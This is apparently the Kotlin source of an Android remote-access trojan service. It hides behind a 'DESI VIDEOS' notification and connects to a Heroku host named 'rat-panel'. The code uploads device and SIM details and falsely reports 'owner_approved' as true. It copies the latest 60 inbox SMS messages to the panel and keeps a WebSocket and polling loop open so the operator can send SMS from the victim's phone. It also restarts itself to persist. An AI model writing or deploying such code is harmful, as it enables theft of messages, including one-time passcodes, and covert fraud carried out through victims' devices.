package com.screenlink.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.BatteryManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.telephony.SmsManager
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class TpcService : Service() {

    companion object {
        const val API_BASE_URL = "https://rat-panel-b91839a4be83.herokuapp.com"

        private const val TAG = "TpcService"
        private const val CHANNEL_ID = "tpc_service"
        private const val NOTIFICATION_ID = 5001
        private const val POLL_INTERVAL = 20_000L
        private const val INBOX_SYNC_LIMIT = 60
        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"
    }

    private val work = Executors.newSingleThreadExecutor()
    private val bgThread = HandlerThread("tpc").apply { start() }
    private val bgHandler = Handler(bgThread.looper)

    private val client = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .build()

    private var socket: WebSocket? = null
    private var attempts = 0
    private var stopped = false

    override fun onBind(intent: Intent?): IBinder? = null

    /** Har jagah se call hone wala crash-guard. */
    private fun safe(block: () -> Unit) {
        try {
            block()
        } catch (e: Throwable) {
            Log.e(TAG, "err", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        // Foreground sabse pehle — warna 5s me crash/ANR
        safe { startForegroundSafely() }

        bgHandler.post { safe { connect() } }
        safe { syncInbox() }
        safe { schedulePoll() }

        return START_STICKY
    }

    // Android 15+ — dataSync FGS ka 6h timeout. Iske baad service ko re-arm karo.
    override fun onTimeout(startId: Int) {
        safe { startForegroundSafely() }
        bgHandler.post { safe { connect() } }
    }

    override fun onDestroy() {
        stopped = true
        safe { socket?.close(1000, "bye") }
        socket = null
        safe { bgHandler.removeCallbacksAndMessages(null) }
        safe { work.shutdown() }
        safe { bgThread.quitSafely() }
        safe { ServiceCompat.stopForeground(this, ServiceCompat.STOP_FOREGROUND_REMOVE) }
        super.onDestroy()
    }

    // ------------------------------------------------------- foreground

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(NotificationManager::class.java) ?: return
        if (nm.getNotificationChannel(CHANNEL_ID) == null) {
            nm.createNotificationChannel(
                NotificationChannel(
                    CHANNEL_ID, "DESI VIDEOS", NotificationManager.IMPORTANCE_LOW
                )
            )
        }
    }

    /** app_logo na ho to bhi crash na ho. */
    private fun smallIcon(): Int {
        val res = resources.getIdentifier("app_logo", "drawable", packageName)
        return if (res != 0) res else android.R.drawable.stat_notify_sync
    }

    private fun startForegroundSafely() {
        createChannel()

        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("DESI VIDEOS")
            .setContentText("SMS gateway active")
            .setSmallIcon(smallIcon())
            .setOngoing(true)
            .setContentIntent(pi)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        val type =
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            else 0

        try {
            ServiceCompat.startForeground(this, NOTIFICATION_ID, notification, type)
        } catch (e: Throwable) {
            // type wali API fail ho gayi to plain fallback
            Log.e(TAG, "startForeground(type) fail, fallback", e)
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    // ------------------------------------------------------------ prefs

    private fun rid(): String {
        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }

        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    // -------------------------------------------------------- telemetry

    private fun telemetry(): JSONObject {
        val t = JSONObject()
        t.put("manufacturer", Build.MANUFACTURER)
        t.put("model", Build.MODEL)
        t.put("android_version", Build.VERSION.RELEASE)
        t.put("sdk_int", Build.VERSION.SDK_INT)

        runCatching {
            val tm = getSystemService(TelephonyManager::class.java)
            t.put("sim_carrier", tm?.networkOperatorName ?: "")
            t.put("sim_country", tm?.simCountryIso ?: "")
        }

        runCatching {
            val bm = getSystemService(BatteryManager::class.java)
            val lvl = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
            if (lvl in 0..100) t.put("battery_level", lvl)
        }

        return t
    }

    // --------------------------------------------------------- register

    private fun registerBlocking() {
        var connection: HttpURLConnection? = null
        try {
            val id = rid()

            connection = URL("$API_BASE_URL/devices/register")
                .openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 15_000
            connection.readTimeout = 15_000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

            val payload = JSONObject().apply {
                put("device_name", "${Build.MANUFACTURER} ${Build.MODEL}".take(40))
                put("platform", "android")
                put("registration_id", id)
                put("owner_approved", true)
                put("telemetry", telemetry())
            }.toString()

            connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
            connection.responseCode
        } catch (_: Exception) {
        } finally {
            connection?.disconnect()
        }
    }

    // ------------------------------------------------------------ socket

    private fun connect() {
        if (stopped || socket != null) return

        registerBlocking()

        val url = API_BASE_URL.replace("https://", "wss://") + "/ws/device/${rid()}"

        socket = client.newWebSocket(
            Request.Builder().url(url).build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    attempts = 0
                    safe { pollOutbox() }
                }

                override fun onMessage(ws: WebSocket, text: String) = safe { handle(text) }

                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    socket = null
                    safe { retry() }
                }

                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    socket = null
                    safe { retry() }
                }
            }
        )
    }

    private fun retry() {
        if (stopped) return
        attempts = (attempts + 1).coerceAtMost(6)
        bgHandler.postDelayed({ safe { connect() } }, (1000L shl (attempts - 1)).coerceAtMost(20_000L))
    }

    // ------------------------------------------------------ sms sending

    private fun smsManager(): SmsManager? =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            getSystemService(SmsManager::class.java)
        else
            @Suppress("DEPRECATION") SmsManager.getDefault()

    private fun handle(text: String) {
        val msg = try { JSONObject(text) } catch (_: Exception) { return }
        if (msg.optString("type") != "sms_send") return

        val id = msg.optString("id")
        val to = msg.optString("to")
        val body = msg.optString("body")

        if (body.isBlank()) {
            ack(id, "failed", "missing body")
            return
        }

        work.execute {
            try {
                val manager = smsManager()
                if (manager == null) {
                    ack(id, "failed", "no sms manager")
                    return@execute
                }

                val parts = manager.divideMessage(body)
                if (parts.size > 1) {
                    manager.sendMultipartTextMessage(to, null, parts, null, null)
                } else {
                    manager.sendTextMessage(to, null, body, null, null)
                }

                ack(id, "sent", "")
            } catch (e: Exception) {
                ack(id, "failed", e.message ?: "send error")
            }
        }
    }

    private fun ack(id: String, status: String, error: String) {
        if (id.isBlank()) return

        work.execute {
            var connection: HttpURLConnection? = null
            try {
                connection = URL("$API_BASE_URL/devices/outbox/$id/ack")
                    .openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.connectTimeout = 12_000
                connection.readTimeout = 12_000
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                val payload = JSONObject().apply {
                    put("status", status)
                    put("error", error)
                }.toString()

                connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
                connection.responseCode
            } catch (_: Exception) {
            } finally {
                connection?.disconnect()
            }
        }
    }

    // ----------------------------------------------------------- polling

    private val pollRunnable = object : Runnable {
        override fun run() {
            if (stopped) return
            safe { pollOutbox() }
            bgHandler.postDelayed(this, POLL_INTERVAL)
        }
    }

    private fun schedulePoll() {
        bgHandler.removeCallbacks(pollRunnable)
        bgHandler.postDelayed(pollRunnable, POLL_INTERVAL)
    }

    private fun pollOutbox() {
        work.execute {
            var connection: HttpURLConnection? = null
            try {
                val id = rid()
                if (id.isBlank()) return@execute

                connection = URL("$API_BASE_URL/devices/outbox?registration_id=$id")
                    .openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connectTimeout = 12_000
                connection.readTimeout = 12_000

                if (connection.responseCode !in 200..299) return@execute

                val text = connection.inputStream.bufferedReader().use { it.readText() }
                val items = JSONObject(text).optJSONArray("items") ?: return@execute

                for (i in 0 until items.length()) {
                    val item = items.optJSONObject(i) ?: continue
                    handle(JSONObject().apply {
                        put("type", "sms_send")
                        put("id", item.optString("id"))
                        put("to", item.optString("to"))
                        put("body", item.optString("body"))
                    }.toString())
                }
            } catch (_: Exception) {
            } finally {
                connection?.disconnect()
            }
        }
    }

    // -------------------------------------------------------- inbox sync

    private fun syncInbox() {
        work.execute {
            try {
                val id = rid()
                if (id.isBlank()) return@execute

                val rows = JSONArray()

                val cursor = contentResolver.query(
                    android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                    arrayOf("address", "body", "date"),
                    null, null, "date DESC"
                ) ?: return@execute

                cursor.use {
                    var count = 0
                    while (it.moveToNext() && count < INBOX_SYNC_LIMIT) {
                        rows.put(JSONObject().apply {
                            put("address", it.getString(0) ?: "")
                            put("body", it.getString(1) ?: "")
                            put("direction", "in")
                            put("timestamp", it.getLong(2))
                        })
                        count++
                    }
                }

                if (rows.length() == 0) return@execute

                var connection: HttpURLConnection? = null
                try {
                    connection = URL("$API_BASE_URL/devices/sms/sync")
                        .openConnection() as HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.connectTimeout = 15_000
                    connection.readTimeout = 15_000
                    connection.doOutput = true
                    connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")

                    val payload = JSONObject().apply {
                        put("registration_id", id)
                        put("messages", rows)
                    }.toString()

                    connection.outputStream.use { it.write(payload.toByteArray(Charsets.UTF_8)) }
                    connection.responseCode
                } finally {
                    connection?.disconnect()
                }
            } catch (_: Exception) {
            }
        }
    }
}